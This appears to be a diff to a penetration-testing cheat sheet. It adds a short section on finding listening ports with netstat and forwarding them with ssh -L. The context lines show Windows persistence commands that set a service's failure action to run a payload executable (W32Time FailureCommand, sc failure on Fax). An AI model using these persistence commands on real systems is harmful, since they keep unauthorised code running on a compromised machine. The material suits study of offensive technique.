@@ -138,3 +138,10 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImageP
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\payload.exe"
 sc failure Fax command= "\"c:\Windows\system32\payload.exe\""
 ```
+
+### [Locate and Portfoward using ssh]
+```
+netstat -tulpn | grep LISTEN
+ssh -L 8000:127.0.0.1:8000 username@IP
+ssh -L 8000:127.0.0.1:8000 -i id_rsa username@IP
+```
